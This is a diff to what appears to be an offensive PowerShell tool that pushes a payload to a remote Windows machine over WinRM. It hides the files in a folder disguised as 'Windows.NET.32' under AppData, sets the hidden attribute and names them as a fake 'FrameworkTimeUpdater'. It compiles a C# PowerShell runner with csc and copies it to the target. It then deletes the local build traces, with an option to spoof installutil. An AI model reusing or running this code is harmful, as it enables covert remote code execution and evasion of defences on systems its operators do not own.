@@ -87,6 +87,7 @@ break;
 }
 $hiddenpath="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32"
 $hiddenpath2="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\"
+$normpath="C:\users\$env:username\Desktop"
 if($testconnection){
 if(Test-Connection -ComputerName $remotemachine -Count 4){
 if(Get-Service -Name WinRM -ComputerName $remotemachine){
@@ -120,22 +121,23 @@ Write-Host "You have a session open"
 } #End Else
 
 #This is where it starts to create the C script and executable for the execution of the function
+New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory
 $creduser=($Creds).UserName
 Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory;$change=Get-item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32";
 $change.Attributes="hidden"}
 $filebytes=Get-Content -Path $filepath -Encoding Byte
-Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1" -ItemType file}
-Invoke-Command -Session $session {[system.io.file]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1",$using:filebytes)}
+New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1" -ItemType file
+[system.io.file]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1",$using:filebytes)
 if($Out){
 $Functioncommand+="`|Out-File -Filepath C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename"
-invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";}
+Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";
 }
 else{
-invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";}
+Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";
 }
 
-$itempath="$hiddenpath2\FrameworkTimeUpdater.cs"
-invoke-command -Session $session{ New-Item -Path "$using:itempath" -ItemType file -Value "using System;
+$itempath="$normpath\FrameworkTimeUpdater.cs"
+New-Item -Path "$using:itempath" -ItemType file -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -166,11 +168,18 @@ invoke-command -Session $session{ New-Item -Path "$using:itempath" -ItemType fil
  pipeline.Invoke();
  }
  }
- "}
- 
+ "
+cd $realpath
 invoke-command -Session $session{ cd $using:realpath}
-$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" `"$itempath`""
-Invoke-Command -Session $session{ Invoke-Expression -Command $using:command}
+$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"$normpath\FrameworkTimeUpdater.exe`" `"$itempath`""
+Invoke-Expression -Command $using:command
+$file=Get-Content -Path "$normpath\FrameworkTimeUpdater.exe" -Encoding Byte
+$file2=Get-Content -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1" -Encoding Byte
+Invoke-Command -Session $session{[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1",$using:file2)}
+Invoke-Command -Session $session{[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe",$using:file)}
+rm $itempath
+rm "$normpath\FrameworkTimeUpdater.exe"
+rm C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32 -Recurse -Force
 
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
